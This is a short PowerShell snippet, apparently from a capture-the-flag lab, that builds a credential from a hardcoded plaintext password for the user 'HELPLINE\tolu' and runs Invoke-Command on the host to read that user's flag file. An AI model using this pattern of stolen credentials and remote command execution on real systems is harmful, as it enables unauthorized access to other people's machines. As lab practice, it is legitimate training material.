$password='!zaq1234567890pl!99'|convertto-securestring -asplaintext -force;
$cred=new-object -typename system.management.automation.pscredential('HELPLINE\tolu',$password);
Invoke-Command -computer HELPLINE -credential $cred {type c:\users\tolu\desktop\user.txt};
